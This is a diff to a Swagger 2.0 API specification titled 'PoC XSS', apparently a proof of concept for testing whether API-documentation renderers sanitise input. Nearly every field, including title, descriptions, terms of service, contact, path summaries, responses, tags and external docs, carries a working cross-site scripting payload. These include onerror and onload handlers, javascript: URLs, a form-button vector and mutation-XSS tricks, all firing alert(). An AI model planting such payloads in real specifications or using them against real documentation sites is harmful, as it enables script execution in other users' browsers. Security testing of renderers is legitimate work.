@@ -1,14 +1,43 @@
 swagger: '2.0'
 info:
-  title: 'PoC XSS'
-  description: '<img src=x onerror=alert(document.domain)>'
+  title: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x" />'
+  description: |
+    Teste 1: <a href="javascript:alert('XSS1')">CLIQUE AQUI 1</a>
+    
+    Teste 2: [Click Me](javascript:alert('XSS2'))
+    
+    Teste 3: <form><button formaction="javascript:alert('XSS3')">CLICK BUTTON</button></form>
+    
+    Teste 4: <math><mtext><table><mglyph><style><img src=x onerror=alert('XSS4')>
+    
+    Teste 5: <noscript><p title="</noscript><img src=x onerror=alert('XSS5')>">
+    
+    Teste 6: <img src=x onerror=alert('XSS6')>
+    
+    Teste 7: <svg onload=alert('XSS7')>
+  termsOfService: '<img src=x onerror=alert("XSS-TOS")>'
+  contact:
+    name: '<svg onload=alert("XSS-CONTACT")>'
   version: '1.0'
 basePath: /api/
 paths:
-  /test:
+  /test1:
     get:
-      summary: 'Test'
-      description: '<svg onload=alert(1)>'
+      summary: '<img src=x onerror=alert("XSS-SUM1")>'
+      description: '<a href="javascript:alert(document.domain)">LINK XSS</a>'
       responses:
         '200':
           description: 'ok'
+  /test2:
+    post:
+      summary: 'Mutation XSS'
+      description: '<math><mtext><table><mglyph><style><img src=x onerror=alert("XSS-PATH2")>'
+      responses:
+        '200':
+          description: '<svg onload=alert("XSS-RESP")>'
+tags:
+  - name: '<img src=x onerror=alert("XSS-TAG")>'
+    description: '<a href="javascript:alert(999)">TAG LINK</a>'
+externalDocs:
+  description: '<svg onload=alert("XSS-DOCS")>'
+  url: 'javascript:alert("XSS-URL")'
